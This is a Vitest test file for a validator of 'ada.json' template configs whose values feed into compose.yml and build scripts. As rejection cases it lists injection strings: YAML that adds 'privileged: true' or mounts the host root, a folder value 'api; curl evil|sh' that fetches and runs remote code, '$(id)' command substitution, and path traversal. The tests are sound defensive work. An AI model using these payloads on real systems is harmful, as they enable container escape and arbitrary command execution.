import { describe, it, expect } from 'vitest';
import { DEFAULT_ADA, readAdaConfig } from './ada-config.js';

describe('ada.json — description of a template', () => {
  it('without a file: behaviour of the existing projects (Vue + NestJS + PostgreSQL)', () => {
    expect(readAdaConfig(null)).toBe(DEFAULT_ADA);
    expect(DEFAULT_ADA.preview.database).toBe('postgres');
  });

  it('reads a mockup without database or API, with the default values', () => {
    const config = readAdaConfig(
      JSON.stringify({
        type: 'mockup',
        requiredChecks: ['Maquette'],
        checks: ['cd /app && npm test'],
        preview: { npm: ['.'], main: 'cd /app && npx vite --host 0.0.0.0 --port 5173' },
      }),
    );
    expect(config).toMatchObject({ type: 'mockup', customize: [], preview: { database: null, image: 'node:24-bookworm', port: 5173, before: [], background: [] } });
  });

  it('refuses an incomplete ada.json, saying what is missing', () => {
    expect(() => readAdaConfig(JSON.stringify({ type: 'fusee', preview: {} }))).toThrow(/ada\.json invalide : .*type/);
  });

  describe('values that end up in compose.yml and in the scripts', () => {
    const withValues = (preview: Record<string, unknown>) =>
      JSON.stringify({ type: 'mockup', requiredChecks: ['M'], checks: ['x'], preview: { main: 'npx vite', ...preview } });

    it.each(['node:24-bookworm', 'python:3.13-slim', 'ghcr.io/org/image:1.2'])('accepts the image %s', (image) => {
      expect(readAdaConfig(withValues({ image })).preview.image).toBe(image);
    });

    it.each([
      'node:24\n    privileged: true',
      'node:24 --privileged',
      'node:24"\n    volumes: ["/:/hote"]',
      '../image',
      'Node:24',
      '',
    ])('refuses the image %j', (image) => {
      expect(() => readAdaConfig(withValues({ image }))).toThrow(/ada\.json invalide : preview\.image/);
    });

    it.each(['.', 'api', 'front', 'services/api', './front'])('accepts the folder %s', (folder) => {
      expect(readAdaConfig(withValues({ npm: [folder], pip: [folder] })).preview.npm).toEqual([folder]);
    });

    it.each(['..', '../hors', 'api/../../hors', '/etc', 'api; curl evil|sh', 'api\nautre', 'a b', '$(id)', 'api/', ''])(
      'refuses the folder %j (npm as well as pip)',
      (folder) => {
        expect(() => readAdaConfig(withValues({ npm: [folder] }))).toThrow(/preview\.npm/);
        expect(() => readAdaConfig(withValues({ pip: [folder] }))).toThrow(/preview\.pip/);
      },
    );
  });
});
